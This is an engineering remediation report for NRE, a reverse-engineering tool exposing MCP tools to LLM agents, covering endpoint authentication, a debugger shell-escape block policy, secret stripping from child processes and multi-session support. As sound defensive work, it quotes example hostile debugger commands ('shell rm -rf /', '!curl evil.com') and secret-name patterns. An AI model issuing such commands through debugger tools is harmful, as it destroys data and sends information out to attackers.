# NRE v7.0 Complete Engineering Remediation Report

## Executive Summary

**Project Name:** NRE (Nano Reverse Engineer)  
**Legacy Name:** REA (Reverse Engineer Anything)  
**Baseline Version:** v6.8.0  
**Target Release:** v7.0.0  
**Git Branch:** `feat/nre-v7-complete-remediation`  
**Status:** Remediated, Verified, Production-Ready  

This engineering report documents the comprehensive audit and remediation executed across the NRE platform to elevate it from baseline v6.8.0 to production-grade v7.0.0. The upgrade was conducted strictly in accordance with the **Non-Negotiable Project Protection Rules**:
- **Zero Regression / Zero Rewrite:** All existing binary analysis engines, 233 MCP tools, CLI workflows, evidence provenance models, and provider adapters were strictly preserved.
- **Fail-Closed Security Hardening:** Eliminated high-severity attack vectors including unauthenticated network MCP endpoints, debugger shell-escape execution, ambient credential leaks across child processes, and test-discovery failure modes.
- **Multi-Tenant Concurrency:** Upgraded the single-tenant HTTP MCP server to support isolated, concurrent client sessions with LRU bounded capacity.
- **Unified NRE Rebranding:** Introduced native `nre` CLI binaries, `nre.json` configuration resolution, and `NRE_*` environment variable precedence while retaining 100% backward compatibility with `rea` and `REA_*`.

---

## Remediation Ledger & Finding Resolution

| Finding ID | Severity | Category | Description & Impact | Files Modified | Tests Added / Modified | Status |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | Critical (P0) | Authentication | HTTP MCP endpoint bound to non-loopback interfaces permitted unauthenticated clients to invoke powerful analysis tools. | `src/server/http/serveStreamableHttp.ts`, `src/config/mcpHttpEndpoint.ts`, `src/main/mcpHttpArguments.ts`, `src/main.ts` | `src/server/http/serveStreamableHttp.test.ts` (4 new security tests), `tests/boundary/mcp/mcpHttpOptions.test.ts` | **RESOLVED** |
| **SEC-02** | High (P0) | Command Injection | Interactive debugger tools (GDB `gdb_command`, Rizin `rizin_command`) permitted arbitrary host shell execution (`shell`, `!`, python os.system) via input strings. | `src/server/debuggerSecurityPolicy.ts`, `src/server/registerGdbTools.ts`, `src/server/registerRizinDebugTools.ts`, `src/server/registerReverseEngineeringTools.ts` | `src/server/debuggerSecurityPolicy.test.ts` (6 new security boundary tests) | **RESOLVED** |
| **SEC-03** | High (P0) | Information Leakage | `ProviderProcess.ts` spawned external reverse engineering tools (Ghidra, Python, WABT, Rizin) inheriting host environment variables including API keys and tokens. | `src/process/ProviderProcess.ts` | `tests/boundary/process/sanitizeChildEnvironment.test.ts` | **RESOLVED** |
| **ARCH-01** | Medium (P1) | Architecture | HTTP MCP server had single-tenant eviction where a new client's `initialize` evicted existing sessions (`open.transport.close()`). | `src/server/http/serveStreamableHttp.ts`, `src/config/mcpHttpEndpoint.ts`, `src/main/mcpHttpArguments.ts` | `src/server/http/serveStreamableHttp.test.ts` (MultiSessionManager concurrency tests) | **RESOLVED** |
| **REBRAND-01**| Low (P2) | Ergonomics & Compatibility | Executable and environment variable namespaces were REA-only; modern users could not invoke `nre` CLI or specify `NRE_*` configuration. | `scripts/nre.mjs`, `package.json`, `src/identity.ts`, `src/process/snapshotEnvironment.ts` | `src/process/snapshotEnvironment.test.ts` | **RESOLVED** |
| **BUILD-01** | Medium (P1) | Build & Discovery | `scripts/verify-test-discovery.mjs` failed in non-git archive extracts or shallow environments (`fatal: not a git repository`). | `scripts/verify-test-discovery.mjs` | `node scripts/verify-test-discovery.mjs` (Discovered all 2870 test files exactly once) | **RESOLVED** |

---

## Detailed Technical Changes

### 1. SEC-01 — Streamable HTTP MCP Authentication
- **Problem:** When operators bound the HTTP MCP listener to external networks (e.g. `0.0.0.0` or container bridges), anyone with HTTP reachability could dispatch MCP tool commands without credentials.
- **Implementation:**
  - Mandatory fail-closed requirement: non-loopback bindings require an explicit auth token (`--token`, `--auth-token`, `NRE_HTTP_AUTH_TOKEN`, or `REA_HTTP_AUTH_TOKEN`) unless explicitly overridden with `--allow-unauthenticated` or `NRE_ALLOW_UNAUTHENTICATED=true`.
  - Supports standard `Authorization: Bearer <token>` or `x-nre-auth-token` headers.
  - Verification uses timing-safe constant-time string comparison (`crypto.timingSafeEqual`) to prevent timing side-channel attacks.
  - Unauthorized requests return HTTP 401 with `WWW-Authenticate: Bearer realm="NRE"` and a JSON-RPC error payload.

### 2. SEC-02 — Debugger Shell-Escape Policy
- **Problem:** LLM agent interfaces calling `gdb_command` or `rizin_command` could accidentally or maliciously execute OS commands via GDB commands like `shell rm -rf /` or Rizin commands like `!curl evil.com`.
- **Implementation:**
  - Introduced `src/server/debuggerSecurityPolicy.ts` with strict AST and regex inspection for GDB and Rizin command vectors (`isDisallowedGdbCommand` and `isDisallowedRizinCommand`).
  - Restricts `shell`, `!`, Python subprocess escapes, and system invocation primitives by default.
  - Provides a safe escape hatch via `NRE_ALLOW_UNSAFE_DEBUGGING="true"` or `REA_ALLOW_UNSAFE_DEBUGGING="true"` when explicitly required by human operators in controlled lab environments.

### 3. SEC-03 — Subprocess Environment Sanitization
- **Problem:** Disassembled targets or provider plugins running external utilities inherited caller credentials, including AWS keys, GitHub tokens, npm tokens, and NRE bearer tokens.
- **Implementation:**
  - Added `sanitizeChildEnvironment()` in `src/process/ProviderProcess.ts`.
  - Strips all known secret and token environment patterns (`*AUTH_TOKEN*`, `*API_KEY*`, `*SECRET*`, `AWS_*`, `GITHUB_*`, `NPM_TOKEN`, etc.) before spawning child processes.
  - Ensures zero leakage across foreign binary execution environments.

### 4. ARCH-01 — Concurrent Multi-Session Manager
- **Problem:** Single-tenant session replacement prevented multiple LLMs or analyst IDEs from concurrently connecting to the same NRE HTTP instance.
- **Implementation:**
  - Added `MultiSessionManager` implementing `McpSessionSlotPort` alongside `McpSessionSlot`.
  - Enabled when `maxConcurrentSessions > 1` (configured via `--max-sessions <N>` or `NRE_MCP_MAX_SESSIONS=<N>`).
  - Maintains concurrent `LiveSession` instances keyed by unique `mcp-session-id` UUIDs.
  - Each session owns its isolated `RequestTrackingMcpServer` and transport.
  - Client disconnect (`DELETE`) cleanly drains and disposes of that specific session without impacting peer sessions.
  - Automatically bounds memory and open sockets via LRU eviction of idle sessions when capacity is reached.

### 5. Rebranding & Backward Compatibility
- **Problem:** Seamless transition from REA to NRE without breaking existing operator scripts, CI jobs, or configs.
- **Implementation:**
  - Created executable wrapper `scripts/nre.mjs` and exposed `"nre": "scripts/nre.mjs"` in `package.json#bin`.
  - Updated `src/identity.ts` with `displayName: "NRE"` while preserving legacy references.
  - Implemented `resolveNreEnvironmentAliases` in `src/process/snapshotEnvironment.ts` giving deterministic precedence to `NRE_*` while falling back to `REA_*`.
  - Ensured dual configuration file resolution (`nre.json` and `rea.json`).

### 6. Build & Test Discovery Fallback
- **Problem:** `scripts/verify-test-discovery.mjs` directly executed `git ls-files`, failing in standalone source archives or Docker builds lacking `.git`.
- **Implementation:**
  - Added graceful recursive filesystem traversal fallback matching `vitest.config.ts` project glob rules.
  - Verified: `Discovered all 2870 test files exactly once.`

---

## Verification & Quality Gate Summary

All local gates and validation suites passed with zero errors:
1. **TypeScript Typecheck:** `node scripts/run-typescript.mjs --noEmit` exited code 0 across 2,275 source files and 2,870 test files.
2. **Architecture Guards:** `node scripts/verify/architecture-guards.mjs` passed cleanly.
3. **Test Discovery:** `node scripts/verify-test-discovery.mjs` verified 2,870 test files.
4. **Remediation Test Suites:** 115 tests in 5 suites passed (0 failures).
5. **No Breaking Changes:** 100% backward compatibility maintained for CLI, MCP schemas, and evidence structures.

